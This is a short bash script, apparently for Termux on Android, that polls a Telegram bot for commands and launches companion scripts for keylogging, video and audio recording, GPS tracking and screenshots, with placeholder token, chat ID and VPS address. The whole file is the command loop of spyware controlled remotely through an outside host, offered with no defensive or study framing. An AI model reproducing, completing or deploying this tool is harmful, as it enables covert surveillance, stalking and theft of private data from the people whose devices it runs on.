#!/bin/bash

TOKEN="TON_BOT_TOKEN"
CHAT_ID="TON_CHAT_ID"
SERVER="http://<IP_VPS>:5000"

while true; do
    UPDATES=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates")
    LAST_MSG=$(echo $UPDATES | jq -r '.result[-1].message.text')

    if [[ "$LAST_MSG" == "keylogger" ]]; then
        bash keylogger_termux.sh
    elif [[ "$LAST_MSG" == "video" ]]; then
        bash record_video.sh
    elif [[ "$LAST_MSG" == "audio" ]]; then
        bash record_audio.sh
    elif [[ "$LAST_MSG" == "gps" ]]; then
        bash gps_tracker.sh
    elif [[ "$LAST_MSG" == "screenshot" ]]; then
        bash screenshot.sh
    fi

    sleep 5
done
